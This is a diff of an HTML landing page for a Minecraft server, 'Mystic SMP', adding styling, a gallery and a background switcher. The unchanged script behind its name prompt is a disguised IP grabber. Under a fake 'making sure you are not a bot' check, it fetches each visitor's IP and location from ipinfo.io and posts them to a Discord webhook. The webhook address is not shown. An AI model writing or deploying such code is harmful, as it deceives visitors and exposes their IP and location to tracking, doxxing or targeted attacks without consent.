@@ -1,31 +1,155 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
+  <meta charset="UTF-8">
   <title>MYSTIC SMP</title>
   <style>
-    #mainPage, #welcomePage {
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      color: #fff;
+      background: url('bg1.jpg') no-repeat center center fixed;
+      background-size: cover;
+      transition: background-image 1s ease-in-out;
+    }
+
+    #mainPage, #mysticPage {
       display: none;
     }
+
     #mainPage {
       display: block;
+      padding: 100px 20px;
+      text-align: center;
+      background: rgba(0, 0, 0, 0.6);
+      height: 100vh;
+    }
+
+    #mainPage input, #mainPage button {
+      padding: 10px;
+      font-size: 1rem;
+      margin: 10px;
+      border-radius: 8px;
+      border: none;
+    }
+
+    #status {
+      margin-top: 15px;
+      font-weight: bold;
+    }
+
+    header {
+      text-align: center;
+      padding: 60px 20px 20px;
+      background: rgba(0, 0, 0, 0.5);
+    }
+
+    header h1 {
+      font-size: 3rem;
+      text-shadow: 2px 2px 5px #000;
+    }
+
+    header p {
+      font-size: 1.2rem;
+      margin-top: 10px;
+      opacity: 0.8;
+    }
+
+    .gallery {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 15px;
+      padding: 40px 20px;
+      background: rgba(0, 0, 0, 0.6);
+    }
+
+    .gallery img {
+      width: 300px;
+      height: 200px;
+      object-fit: cover;
+      border-radius: 12px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.5);
+      transition: transform 0.3s;
+    }
+
+    .gallery img:hover {
+      transform: scale(1.05);
+    }
+
+    footer {
+      text-align: center;
+      padding: 30px;
+      background: rgba(0, 0, 0, 0.7);
+      font-size: 0.9rem;
+      color: #ccc;
+    }
+
+    .bg-switcher {
+      position: fixed;
+      top: 10px;
+      right: 10px;
+      z-index: 10;
+    }
+
+    .bg-switcher button {
+      margin: 5px;
+      padding: 8px 12px;
+      background: rgba(255, 255, 255, 0.2);
+      border: none;
+      color: #fff;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+
+    .bg-switcher button:hover {
+      background: rgba(255, 255, 255, 0.4);
     }
   </style>
 </head>
 <body>
+
+  <!-- Background Switcher -->
+  <div class="bg-switcher">
+    <button onclick="changeBG('bg1.jpg')">BG 1</button>
+    <button onclick="changeBG('bg2.jpg')">BG 2</button>
+    <button onclick="changeBG('bg3.jpg')">BG 3</button>
+  </div>
+
   <!-- Page 1: Name + IP collection -->
   <div id="mainPage">
     <h2>Welcome!</h2>
-    <p>what do we call you?</p>
+    <p>What do we call you?</p>
     <input type="text" id="nameInput" placeholder="Your name" />
+    <br>
     <button id="submitBtn">Submit</button>
     <p id="status"></p>
   </div>
 
-  <!-- Page 2: Mystic Website content -->
-  <div id="welcomePage">
-    <h1>Welcome to Mystic SMP!</h1>
-    <p>You’ve been verified. Enjoy exploring our server and community.</p>
-    <!-- Add more content here -->
+  <!-- Page 2: Mystic Website -->
+  <div id="mysticPage">
+    <header>
+      <h1>🌌 Mystic SMP</h1>
+      <p>The most magical Minecraft adventure awaits!</p>
+    </header>
+
+    <section class="gallery">
+      <img src="img1.jpg" alt="Mystic SMP 1">
+      <img src="img2.jpg" alt="Mystic SMP 2">
+      <img src="img3.jpg" alt="Mystic SMP 3">
+      <img src="img4.jpg" alt="Mystic SMP 4">
+      <img src="img5.jpg" alt="Mystic SMP 5">
+      <img src="img6.jpg" alt="Mystic SMP 6">
+    </section>
+
+    <footer>
+      &copy; 2025 Mystic SMP — All rights reserved.
+    </footer>
   </div>
 
   <script>
@@ -34,11 +158,11 @@
     document.getElementById("submitBtn").addEventListener("click", () => {
       const name = document.getElementById("nameInput").value.trim();
       if (!name) {
-        alert("what do we call you?");
+        alert("What do we call you?");
         return;
       }
 
-      document.getElementById("status").textContent = "making sure you are not a bot";
+      document.getElementById("status").textContent = "Making sure you are not a bot...";
 
       fetch("https://ipinfo.io/json")
         .then(res => res.json())
@@ -61,22 +185,26 @@
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify(message)
           }).then(() => {
-            document.getElementById("status").textContent = "all good!";
-            // Redirect to second section after short delay
+            document.getElementById("status").textContent = "All good! Entering Mystic SMP...";
             setTimeout(() => {
               document.getElementById("mainPage").style.display = "none";
-              document.getElementById("welcomePage").style.display = "block";
+              document.getElementById("mysticPage").style.display = "block";
             }, 2000);
           }).catch(err => {
-            document.getElementById("status").textContent = "YOU AREE A BOT!";
+            document.getElementById("status").textContent = "YOU ARE A BOT!";
             console.error("Discord webhook error:", err);
           });
         })
         .catch(err => {
-          document.getElementById("status").textContent = "YOU AREE A BOT!";
+          document.getElementById("status").textContent = "YOU ARE A BOT!";
           console.error("IP info error:", err);
         });
     });
+
+    function changeBG(image) {
+      document.body.style.backgroundImage = `url('${image}')`;
+    }
   </script>
 </body>
 </html>
+
